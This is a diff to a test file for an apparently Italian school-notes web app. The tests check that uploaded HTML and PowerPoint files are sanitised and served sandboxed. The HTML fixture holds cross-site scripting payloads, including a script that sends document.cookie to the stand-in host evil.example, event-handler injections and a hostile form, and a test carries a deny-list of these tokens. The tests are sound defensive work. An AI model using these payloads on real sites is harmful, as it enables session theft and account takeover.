@@ -9,9 +9,9 @@ const { startSite, Client, makeAdmin } = require('./helpers');
 
 let site, admin, mario, classId, storia;
 const EVIL = `<!DOCTYPE html><html><head><title>Lezione</title><script>fetch('//evil.example/'+document.cookie)</script>
-<style>@import url(//evil.example/x.css); body{background:url(http://evil.example/p.png)}</style>
+<style>@import url(//evil.example/x.css); body{background:url(http://evil.example/p.png)} .tit{font-size:40px}</style>
 <meta http-equiv="refresh" content="0;url=http://evil.example"></head>
-<body onload="steal()"><h1 onclick="steal()">Le rette</h1><p>Una retta passa per <b>due punti</b>.</p>
+<body onload="steal()" style="background:#eef"><h1 onclick="steal()" class="tit" style="color:#c00">Le rette</h1><p>Una retta passa per <b>due punti</b>.</p>
 <a href="javascript:steal()">cattivo</a> <a href="https://scuola.example/p" onclick="x()">buono</a>
 <iframe src="//evil.example"></iframe><img src="http://evil.example/track.png" alt="tracker"><img src="x" onerror="steal()">
 <form action="//evil.example"><input name="pw"></form><svg onload="steal()"></svg>
@@ -49,6 +49,7 @@ test('HTML upload is cleaned, served sandboxed, and its text is ready for the AI
     assert.match(res.headers.get('content-security-policy'), /sandbox/);
     assert.match(res.headers.get('content-security-policy'), /default-src 'none'/);
     for (const bad of ['<script', 'evil.example', 'onclick', 'onload', 'onerror', 'javascript:', '<iframe', '<form', '<input', '<svg', '@import', 'http-equiv']) assert.ok(!html.includes(bad), bad);
+    assert.ok(html.includes('.tit{font-size:40px}') && html.includes('color:#c00') && html.includes('class="tit"') && html.includes('background:#eef'), 'the look is kept');
     assert.ok(html.includes('Le rette') && html.includes('due punti') && html.includes('https://scuola.example/p'));
     const t = (await mario.get(`/api/appunti.php?action=file_text&id=${f.id}`)).json;
     assert.match(t.text, /Una retta passa per due punti/);
@@ -81,4 +82,22 @@ test('PDF, text, markdown and HTML go into the single "Per AI" PDF', async () =>
     let text = '';
     try { text = execFileSync('pdftotext', ['-layout', file, '-'], { encoding: 'utf8' }).replace(/\s+/g, ' '); } catch (e) { return; }
     for (const piece of ['Testo in markdown', 'Testo semplice txt', 'Pagina del prof in html', 'Come sono inclusi i file']) assert.ok(text.includes(piece), piece);
+});
+
+test('a PowerPoint can be looked at as slides: text escaped, picture inlined, sandboxed', async () => {
+    const pptx = fs.readFileSync(path.join(__dirname, 'fixtures', 'slide.pptx'));
+    const r = await upload(mario, { class_id: classId, subject_id: storia, kind: 'slide', lesson_date: '2026-10-08' },
+        [{ name: 'slide.pptx', content: pptx, type: 'application/vnd.openxmlformats-officedocument.presentationml.presentation' }]);
+    assert.equal(r.status, 200, JSON.stringify(r.json));
+    const f = (await mario.get(`/api/appunti.php?action=items&class_id=${classId}&kind=slide`)).json.items.find((i) => i.lesson_date === '2026-10-08').files[0];
+    const res = await fetch(`${site.base}/api/appunti.php?action=file&id=${f.id}&view=1`, { headers: { Cookie: mario.cookieHeader() } });
+    assert.equal(res.status, 200);
+    assert.match(res.headers.get('content-type'), /text\/html/);
+    assert.match(res.headers.get('content-security-policy'), /sandbox/);
+    const html = await res.text();
+    assert.ok(html.includes('Il modello TCP/IP') && html.includes('Livello applicazione') && html.includes('<td>Porta</td>'));
+    assert.ok(html.includes('data:image/png;base64,') && html.includes('background:#1F3A5F'));
+    assert.ok(!html.includes('<script') && html.includes('&lt;script&gt;'), 'text is escaped');
+    const stranger = new Client(site); await stranger.register('ht_stranger');
+    assert.equal((await fetch(`${site.base}/api/appunti.php?action=file&id=${f.id}&view=1`, { headers: { Cookie: stranger.cookieHeader() } })).status, 404);
 });
